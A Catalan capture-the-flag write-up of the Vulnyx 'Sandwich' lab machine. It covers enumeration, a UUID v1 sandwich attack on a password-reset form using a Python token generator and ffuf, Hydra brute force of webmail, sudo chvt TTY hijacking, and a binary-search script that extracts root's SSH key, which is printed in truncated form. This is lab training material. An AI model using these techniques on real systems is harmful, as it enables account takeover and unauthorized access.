---
author: Lenam
pubDatetime: 2025-05-12T00:00:00Z
title: WriteUp Sandwich - Vulnyx
urlSlug: sandwich-writeup-vulnyx-ca
featured: false
draft: false
ogImage: "../../../assets/images/sandwich/OpenGraph.png"
tags:
    - Vulnyx
    - Writeup
    - UUID sandwich attack
    - Brute force
description:
  En aquest writeup es descriu la vulneració i escalada de la màquina Sandwich de la plataforma Vulnyx, on es podrà practicar la tècnica de sandwich en un formulari de recordar contrasenya que genera UUIDs vulnerables a aquesta tècnica.
lang: ca
translationId: sandwich-writeup-vulnyx
---

![alt text](../../../assets/images/sandwich/OpenGraph.png)

En aquest writeup es descriu la vulneració i escalada de la màquina Sandwich de la plataforma Vulnyx, on es podrà practicar la tècnica de sandwich en un formulari de recuperació de contrasenya que genera UUIDs vulnerables a aquesta tècnica. Aquesta tècnica és aplicable a qualsevol token o hash insegur generat amb marques de temps o dades predictibles.

En aquest writeup, la IP de la nostra màquina atacant és `192.168.1.181` i la IP de la nostra víctima és `192.168.1.188`.

## Taula de continguts

## Enumeració

### nmap

Realitzem un escaneig de tots els ports amb nmap.

```bash
nmap -p- -sS -Pn -n 192.168.1.188
```

![nmap1](../../../assets/images/sandwich/nmap1.png)

Trobem dos ports oberts: el port 80 i el 22. Realitzem un escaneig més exhaustiu utilitzant els scripts de nmap per intentar obtenir més informació sobre els serveis d'ambdós ports.

```bash
nmap -p22,80 -sCV -Pn -n 192.168.1.188
```

![nmap2](../../../assets/images/sandwich/nmap2.png)

En aquest segon escaneig podem veure com en el `http-title` del lloc web del port `80` apareix el domini `sandwich.nyx`. L'afegim al fitxer `/etc/hosts` de la nostra màquina i intentem descobrir possibles subdominis.

```bash
echo "192.168.1.188 sandwich.nyx" | sudo tee -a /etc/hosts
```

### subdomain fuzz

```bash
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u sandwich.nyx -t 30 --append-domain  
```

![subdomain fuzz](../../../assets/images/sandwich/subdomaindicobery.png)

Ràpidament trobem el subdomini `webmail.sandwich.nyx`, l'afegim també al fitxer `/etc/hosts`.

```bash
echo "192.168.1.188 webmail.sandwich.nyx" | sudo tee -a /etc/hosts
```

### dir fuzz

Realitzem fuzzing de directoris i fitxers amb extensió php i txt en els dos dominis `sandwich.nyx` i `webmail.sandwich.nyx`.

#### sandwich.nyx

![alt text](../../../assets/images/sandwich/image-1.png)

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://sandwich.nyx -x .php,.txt           
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sandwich.nyx
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 7845]
/download.php         (Status: 200) [Size: 58]
/img                  (Status: 301) [Size: 310] [--> http://sandwich.nyx/img/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/vendor               (Status: 301) [Size: 313] [--> http://sandwich.nyx/vendor/]
/config.php           (Status: 200) [Size: 0]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/resetpassword.php    (Status: 200) [Size: 361]
Progress: 661677 / 661680 (100.00%)
===============================================================
Finished
===============================================================
```

#### webmail.sandwich.nyx

![alt text](../../../assets/images/sandwich/image-2.png)

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://webmail.sandwich.nyx -x .php,.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://webmail.sandwich.nyx
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 285]
/index.php            (Status: 302) [Size: 0] [--> login.php]
/login.php            (Status: 200) [Size: 784]
/register.php         (Status: 200) [Size: 856]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/inbox.php            (Status: 302) [Size: 0] [--> login.php]
/.php                 (Status: 403) [Size: 285]
/server-status        (Status: 403) [Size: 285]
Progress: 661677 / 661680 (100.00%)
===============================================================
Finished
===============================================================
```

### Enumeració manual

Analitzem tots els endpoints i pàgines trobades. Observem que podem crear una mena de compte de correu electrònic a `http://webmail.sandwich.nyx`. Després, el compte creat a webmail el podem utilitzar per registrar-nos a `http://sandwich.nyx`. Això ens permet tenir guardats els nostres entrepans preferits. 🥪

### fuzz users

L'inici de sessió d'usuaris al lloc web `http://sandwich.nyx` permet saber si un usuari existeix o no, ja que, encara que introduïm una contrasenya incorrecta, el missatge és diferent depenent de si l'usuari existeix o no. Utilitzem això per intentar esbrinar altres usuaris que estan registrats mitjançant força bruta amb `ffuf`. 🔍


```bash
$ ffuf -u "http://sandwich.nyx/" -X POST -d "email=FUZZ@sandwich.nyx&password=anyPassword&login_action=1" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -mr "Incorrect password."

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://sandwich.nyx/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : email=FUZZ@sandwich.nyx&password=anyPassword&login_action=1
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: Incorrect password.
________________________________________________

admin                   [Status: 200, Size: 7917, Words: 1855, Lines: 228, Duration: 55ms]
:: Progress: [17/17] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Hem trobat que també existeix l'usuari `admin@sandwich.nyx`.

## Vulneració

> En aquest writeup es descriu la vulneració esperada. No obstant això, hi ha una manera més fàcil que permet saltar-se l'atac sandwich, descoberta pel hacker `he110wor1d`. El seu enginy mereix reconeixement, i pots trobar la descripció detallada en el seu writeup [Writeup he110wor1d](https://www.cnblogs.com/ShowMeTheBug/p/18810217).

### 🥪 Atac Sandwich 

1. Creem dos usuaris a webmail.sandwich.nyx i ens registrem amb aquests mateixos dos usuaris a sandwich.nyx (Ex. `user1@sandwich.nyx` i `user2@sandwich.nyx`).

2. Des de sandwich.nyx, seleccionem `Forgot Password` en aquest ordre (el més ràpid possible):
   1. Recordar contrasenya per al nostre primer usuari (`user1@sandwich.nyx`).
   2. Recordar contrasenya per a l'usuari `admin@sandwich.nyx`.
   3. Recordar contrasenya per al nostre segon usuari (`user2@sandwich.nyx`).
   Per fer-ho molt ràpid i tenir menys "pernil" en el sandvitx amb els nostres usuaris:
   ```bash
   curl -X POST http://sandwich.nyx/index.php -d "email=user1@sandwich.nyx" -d "reset_action=1" & curl -X POST http://sandwich.nyx/index.php -d "email=admin@sandwich.nyx" -d "reset_action=1" & curl -X POST http://sandwich.nyx/index.php -d "email=user2@sandwich.nyx" -d "reset_action=1"
   ```

3. Ingressam amb els nostres usuaris a webmail.sandwich.nyx i obtenim els dos enllaços per recuperar la contrasenya dels nostres usuaris. Aquests enllaços tenen un UUID v1 que és vulnerable a un atac de Sandwich. Per tant, amb l'enllaç de recuperació de contrasenya de l'usuari `admin@sandwich.nyx` sol·licitat entre els nostres dos usuaris, podem intentar recuperar la contrasenya d'admin. 🔑

Imatge del webmail per a `user1@sandwich.nyx`

![alt text](../../../assets/images/sandwich/image-3.png)

URL del token per a user1 i user2: 

```
http://sandwich.nyx/resetpassword.php?token=2299c1c6-09ca-11f0-8069-080027b218c8
http://sandwich.nyx/resetpassword.php?token=229e2ffe-09ca-11f0-8069-080027b218c8
```

En aquesta URL hi ha un formulari que, mitjançant POST, envia el token i la proposta de contrasenya. Si el token és vàlid, modifica la contrasenya de l'usuari; si el token no és vàlid, apareix el missatge: `Invalid token.` 

Creem un script en Python per generar els possibles UUID v1 entre els dos rebuts pels nostres usuaris.

Aquests serien tots els possibles UUIDs V1 entre els rangs. És important fer les 3 peticions de restaurar la contrasenya el més ràpid possible per tenir un diccionari petit. Si es tarda en fer les peticions, el diccionari pot ocupar GB. 📚

```python
#!/usr/bin/env python3
def generar_uuids_por_lotes(start_hex, end_hex, batch_size=100_000, output_file="uuids.txt"):
    time_mid = "09ca"
    time_hi_and_version = "11f0"
    clock_seq = "8069"
    node = "080027b218c8"

    start = int(start_hex, 16)
    end = int(end_hex, 16)

    with open(output_file, "w") as f:
        for batch_start in range(start, end + 1, batch_size):
            batch_end = min(batch_start + batch_size, end + 1)
            for time_low in range(batch_start, batch_end):
                time_low_hex = f"{time_low:08x}"
                uuid_str = f"{time_low_hex}-{time_mid}-{time_hi_and_version}-{clock_seq}-{node}"
                f.write(uuid_str + "\n")
            print(f"Lote {batch_start}-{batch_end - 1} guardado.")

# Llamada a la función
generar_uuids_por_lotes("2299c1c6", "229e2ffe")
```

Creem el diccionari i utilitzem FUZZ per intentar canviar la contrasenya de l'usuari `admin@sandwich.nyx` a `lenam`.

```bash
$ python3 ./uuids.py
Lote 580501958-580601957 guardado.
Lote 580601958-580701957 guardado.
Lote 580701958-580792318 guardado.
$ ls -lh uuids.txt 
-rw-rw-r-- 1 kali kali 11M mar 25 23:53 uuids.txt
$ ffuf -u "http://sandwich.nyx/resetpassword.php" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "token=FUZZ&new_password=lenam&confirm_password=lenam" -w uuids.txt -fs 420

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://sandwich.nyx/resetpassword.php
 :: Wordlist         : FUZZ: /home/kali/CTFs/Vulnyx/Sandwich/uuids.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : token=FUZZ&new_password=lenam&confirm_password=lenam
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 420
________________________________________________

2299c1c6-09ca-11f0-8069-080027b218c8 [Status: 200, Size: 408, Words: 57, Lines: 16, Duration: 640ms]
229c74ac-09ca-11f0-8069-080027b218c8 [Status: 200, Size: 408, Words: 57, Lines: 16, Duration: 1365ms]
229e2ffe-09ca-11f0-8069-080027b218c8 [Status: 200, Size: 408, Words: 57, Lines: 16, Duration: 64ms]
:: Progress: [290361/290361] :: Job [1/1] :: 1388 req/sec :: Duration: [0:02:32] :: Errors: 0 ::
```

Veiem que s'ha modificat la contrasenya de tres usuaris: els UUIDs del nostre usuari que ja teníem i un tercer que segurament serà de l'usuari admin.

### Força bruta en el webmail

Accedim amb l'usuari `admin@sandwich.nyx` i la contrasenya `lenam` a http://sandwich.nyx.

Ens trobem amb la mateixa pàgina de generació i guardat d'entrepans, però a més hi ha un enllaç per descarregar els entrepans de tots els usuaris.

![alt text](../../../assets/images/sandwich/image-4.png)

Descarreguem un fitxer CSV amb totes les configuracions d'entrepans guardades per tots els usuaris registrats. 📥 Utilitzem aquesta llista d'usuaris per fer fuzzing en el webmail.

Com que sabem que per registrar-se aquí és necessari tenir un correu electrònic a `webmail.sandwich.nyx`, intentem fer força bruta amb aquests usuaris i el wordlist de `10k-most-common.txt` en el webmail.

Llistat d'usuaris que apareixen en el PDF descarregat de `sandwich.nyx`. 📋

```text
ll104567_9q@sandwich.nyx
suraxddq_tw@sandwich.nyx
xerosec_w5@sandwich.nyx
j4ckie_x5@sandwich.nyx
matthygd_x@sandwich.nyx
```

Encara que la llista d'usuaris sembla pertànyer a il·lustres mestres del hacking 😉, amb tot el respecte del món, vam decidir aventurar-nos i utilitzar Hydra amb la llista d'usuaris i el wordlist contra el webmail.

```bash
$ hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt webmail.sandwich.nyx http-post-form "/login.php:email=^USER^&password=^PASS^:Invalid credentials or user not found" -u -t 64 -v
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-30 19:19:59
[DATA] max 64 tasks per 1 server, overall 64 tasks, 50000 login tries (l:5/p:10000), ~782 tries per task
[DATA] attacking http-post-form://webmail.sandwich.nyx:80/login.php:email=^USER^&password=^PASS^:Invalid credentials or user not found
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 1385.00 tries/min, 1385 tries in 00:01h, 48615 to do in 00:36h, 64 active
[STATUS] 1382.00 tries/min, 4146 tries in 00:03h, 45854 to do in 00:34h, 64 active
[STATUS] 1382.00 tries/min, 9674 tries in 00:07h, 40326 to do in 00:30h, 64 active
[VERBOSE] Page redirected to http[s]://webmail.sandwich.nyx:80/inbox.php
[80][http-post-form] host: webmail.sandwich.nyx   login: matthygd_x@sandwich.nyx   password: qweasd

The session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

Després de 7 minuts 😅, trobem la contrasenya del webmail de `matthygd_x@sandwich.nyx`.

Ingresem al webmail i podem veure un missatge que li ha enviat l'administrador amb la contrasenya del seu usuari SSH. 🔑

![alt text](../../../assets/images/sandwich/image-5.png)

Accedim amb les credencials a través del servei SSH.

## Escalada de matthygd_xy a ll104567

```bash
$ id ; echo; cat /etc/passwd|grep sh ; echo ; sudo -l
uid=1000(matthygd_xy) gid=1000(matthygd_xy) grupos=1000(matthygd_xy),100(users)

root:x:0:0:root:/root:/bin/bash
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
matthygd_xy:x:1000:1000:,,,:/home/matthygd_xy:/bin/bash
ll104567:x:1001:1001:,,,:/home/ll104567:/bin/bash

Matching Defaults entries for matthygd_xy on sandwich:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User matthygd_xy may run the following commands on sandwich:
    (root) NOPASSWD: /bin/chvt
```

L'usuari `matthygd_xy` pot executar com a root el binari `/bin/chvt`. Aquest binari serveix per canviar entre terminals virtuals, el mateix que quan premem CTRL+ALT+Fn.

Verifiquem si existeix alguna TTY creada per algun usuari amb `w`.

```
matthygd_xy@sandwich:~$ w
 19:38:20 up 45 min,  2 users,  load average: 0,00, 8,88, 22,24
USER     TTY      DESDE            LOGIN@   IDLE   JCPU   PCPU WHAT
ll104567 tty20    -                18:52   45:56   0.01s  0.01s -bash
matthygd pts/0    192.168.1.181    19:35    0.00s  0.01s   ?    w
```

Podem observar que l'usuari `ll104567` té un terminal obert amb bash, el número del terminal és el `20`.

Amb la comanda `chvt` podem fer que es mostri la TTY de `ll104567` per la pantalla "física" de la màquina.

Actualment a la pantalla física de la màquina es pot observar:

![alt text](../../../assets/images/sandwich/image.png)

Si executem...

```
matthygd_xy@sandwich:~$ sudo /bin/chvt 20
```

... a la pantalla "física" de la màquina ens apareixerà la TTY de `ll104567`.

![alt text](../../../assets/images/sandwich/image-6.png)

En aquest punt, podem instal·lar una clau SSH en l'usuari per accedir des del nostre propi terminal o continuar treballant amb la "pantalla física", un revshell, etc.

## Escalada de ll104567 a root

L'usuari pot executar amb sudo un script a /opt/game.sh.

```bash
ll104567@sandwich:~$ sudo -l
Matching Defaults entries for ll104567 on sandwich:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ll104567 may run the following commands on sandwich:
    (ALL) NOPASSWD: /opt/game.sh

ll104567@sandwich:~$ ls -la /opt
total 12
drwxr-xr-x  2 root root 4096 mar 25 19:00 .
drwxr-xr-x 18 root root 4096 mar 22 23:05 ..
-rwxr-xr-x  1 root root 1535 mar 25 19:00 game.sh
```

El script sembla ser un joc matemàtic; si s'endevina un número, el script retornarà la clau privada de l'usuari root.

```bash
ll104567@sandwich:~$ cat /opt/game.sh 
#!/bin/bash

export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

MAX=2000000

ATTEMPTS=$(/usr/bin/awk -v max="$MAX" 'BEGIN {printf "%d", (log(max)/log(2) + 0.999999)}')

/bin/echo "Hello! What is your name?"
read NAME

NUMBER=$(( ( RANDOM % MAX ) + 1 ))

/bin/echo "Well, $NAME, I'm thinking of a number between 1 and $MAX."
/bin/echo "You have $ATTEMPTS attempts to guess it."

ATTEMPTS_MADE=0

SECRET_FILE="/root/.ssh/id_rsa"

while [ $ATTEMPTS_MADE -lt $ATTEMPTS ]; do
  /bin/echo "Try to guess:"
  read GUESS

  # Validate that the input is a valid number
  if ! [[ "$GUESS" =~ ^[0-9]+$ ]]; then
    /bin/echo "Please, enter a valid number."
    continue
  fi

  ATTEMPTS_MADE=$((ATTEMPTS_MADE + 1))

  if [ $GUESS -lt $NUMBER ]; then
    /bin/echo "Your guess is too low."
  elif [ $GUESS -gt $NUMBER ]; then
    /bin/echo "Your guess is too high."
  else
    break
  fi
done

if [ $GUESS -eq $NUMBER ]; then
  /bin/echo "Good job, $NAME! You guessed my number in $ATTEMPTS_MADE attempts!"
  /bin/echo "Here's your reward:"
  /bin/cat "$SECRET_FILE"
else
  /bin/echo "No, the number I was thinking of was $NUMBER."
fi
```

Tens una sèrie d'intents per poder endevinar el número com a màxim.

```bash
ll104567@sandwich:~$ sudo /opt/game.sh 
Hello! What is your name?
Lenam
Well, Lenam, I'm thinking of a number between 1 and 2000000.
You have 21 attempts to guess it.
Try to guess:
10
Your guess is too low.
Try to guess:
100000
Your guess is too high.
Try to guess:
```

Per resoldre-ho s'ha d'aplicar l'algorisme de cerca binària, molt simple de desenvolupar, fins i tot es podria contestar de forma manual.

La màquina té Python instal·lat, cosa que facilitarà la tasca a molts, fins i tot a ChatGPT:

```python
#!/usr/bin/env python3
import subprocess
import re

def enviar_linea(proc, texto):
    proc.stdin.write(texto + "\n")
    proc.stdin.flush()

def leer_hasta(proc, patron):
    """Lee línea a línea hasta encontrar una que contenga el patrón indicado."""
    salida = ""
    while True:
        linea = proc.stdout.readline()
        if not linea:
            break
        salida += linea
        print(linea, end="")  # Mostrar la salida en pantalla
        if patron in linea:
            break
    return salida

def main():
    # Iniciamos el juego (se asume que el script se llama "juego.sh")
    proc = subprocess.Popen(
        ['sudo','/opt/game.sh'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        universal_newlines=True,
        bufsize=1  # Line buffered
    )

    # Responde al saludo pidiendo el nombre.
    leer_hasta(proc, "What is your name?")
    enviar_linea(proc, "Solver")  # Puedes cambiar el nombre

    # Leemos la línea donde se menciona el rango y extraemos MAX.
    salida = leer_hasta(proc, "I'm thinking of a number between")
    max_match = re.search(r"between 1 and (\d+)", salida)
    if max_match:
        max_value = int(max_match.group(1))
    else:
        max_value = 2000000  # Valor por defecto
    print("Número máximo:", max_value)

    # Leemos la línea que indica la cantidad de intentos permitidos.
    leer_hasta(proc, "attempts to guess it.")

    # Búsqueda binaria
    low = 1
    high = max_value
    intentos = 0

    while True:
        guess = (low + high) // 2  # Calcula el punto medio
        leer_hasta(proc, "Try to guess:")
        print("Intento con:", guess)
        enviar_linea(proc, str(guess))
        intentos += 1

        # Leemos la respuesta del juego
        respuesta = ""
        while True:
            linea = proc.stdout.readline()
            if not linea:
                break
            print(linea, end="")
            respuesta += linea
            # Buscamos las pistas de respuesta
            if "Your guess is too low." in linea or \
               "Your guess is too high." in linea or \
               "Good job," in linea:
                break

        if "Your guess is too low." in respuesta:
            low = guess + 1
        elif "Your guess is too high." in respuesta:
            high = guess - 1
        elif "Good job," in respuesta:
            print(f"¡Adivinado el número en {intentos} intentos!")
            # Leemos hasta que se muestre la recompensa (el contenido del archivo secreto)
            leer_hasta(proc, "Here's your reward:")
            # Leemos el resto de la salida (la recompensa)
            recompensa = proc.stdout.read()
            print(recompensa)
            break
        else:
            print("Respuesta inesperada. Saliendo.")
            break

if __name__ == "__main__":
    main()

```

Creem el fitxer al servidor, l'executem i obtenim la clau privada de root.

```bash
ll104567@sandwich:~$ ./auto.py 
Hello! What is your name?
Well, Solver, I'm thinking of a number between 1 and 2000000.
Número máximo: 2000000
You have 21 attempts to guess it.
Try to guess:
Intento con: 1000000
Your guess is too high.
Try to guess:
Intento con: 500000
Your guess is too high.
Try to guess:
Intento con: 250000
Your guess is too high.
Try to guess:
Intento con: 125000
Your guess is too high.
Try to guess:
Intento con: 62500
Your guess is too high.
Try to guess:
Intento con: 31250
Your guess is too high.
Try to guess:
Intento con: 15625
Your guess is too high.
Try to guess:
Intento con: 7812
Your guess is too low.
Try to guess:
Intento con: 11718
Your guess is too low.
Try to guess:
Intento con: 13671
Your guess is too high.
Try to guess:
Intento con: 12694
Your guess is too low.
Try to guess:
Intento con: 13182
Your guess is too low.
Try to guess:
Intento con: 13426
Your guess is too low.
Try to guess:
Intento con: 13548
Your guess is too low.
Try to guess:
Intento con: 13609
Your guess is too low.
Try to guess:
Intento con: 13640
Your guess is too high.
Try to guess:
Intento con: 13624
Your guess is too high.
Try to guess:
Intento con: 13616
Your guess is too high.
Try to guess:
Intento con: 13612
Your guess is too high.
Try to guess:
Intento con: 13610
Good job, Solver! You guessed my number in 20 attempts!
¡Adivinado el número en 20 intentos!
Here's your reward:
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEAzMoVFzc2RXwrRJ6QA2Kr/trjNxtTpuvKn10uYGmFNcmPfACQfR0H
BBWQUY8LvVg+5UGGEyuC1Kvv9hevyemqVMm5+Xe9D+BCHQoqXoa7VeEd+As736w9+Ly1/D
z0ovVAA1Ae8eRJsHzXHLFcgXflpOh2mdH7hAnzr3sbDFSnUT7VOy86ODMm1PFfC6ec5BjU
z5iQjdHGOpOOTxvAsMIQeZWCgR1/hrnB1LgT82eKakFerk1V1bJTGCqDpOeaVY/oOwTXIX
    ...
    ...
    ...
I7nS3nsGgro0LxFegq4lNK/J0hOxdr0AzYCA0V1URBAc7F1yeIVsfw5agUBctTIETh4vb2
qbXz8zkaUCs3OxD+29tm759C9VV06EghvPGsNLQCNxhUJQADl+alhof4JLgaNsGSAjD0+E
BbrBjxfJ/Thc+/TRnUgi02VXBvEN3lEPPSykgnkrH05sJy3bkkypcSzrhu56I8xH2JNktD
KI7CKEYAOb49G7AAABAQDjtfviGpDjQvFu/a3ftuJTO0jOfMi0KUC4D8gtX0RuLX9kx4en
99te7snBHk667wwOWg1Obo4OKuVQPbI9GpxfP8ExnSBCj7ul6pHTGrHYoKDXFkGE38LdTx
vMEEyqhFiqNIv9iJUMfrZf4WcOWTl+rtJus3xz8yEjxJ+8CXNb3DSGD2AN2my4gmXuSJec
Q3j0qy5I0191AjSaySmfOvFTdXk/2CHq2BiPDyrvZBoJC1/Uo34IJzv7KniWETOn1pXQyW
5e4Z60iiIePJTiXy32FP1CkMfFCqrnCf6vUh7u5/cogU9EFCFxfEcAagP0OMU3pu8stWpw
r1QiwDaFhL5nAAAADXJvb3RAc2FuZHdpY2gBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

El que queda ja m'imagino que saps què és, la clau no té contrasenya i l'usuari root pot accedir mitjançant SSH per llegir l'última flag.

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/Sandwich]
└─$ nano private_root
     
┌──(kali㉿kali)-[~/CTFs/Vulnyx/Sandwich]
└─$ chmod 600 private_root 

┌──(kali㉿kali)-[~/CTFs/Vulnyx/Sandwich]
└─$ ssh root@192.168.1.182 -i private_root 
Linux sandwich 6.1.0-32-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.129-1 (2025-03-06) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 30 19:49:16 2025 from 192.168.1.181
root@sandwich:~# ls
root.txt

```

Això és tot, espero que us hagi agradat la màquina i el write-up.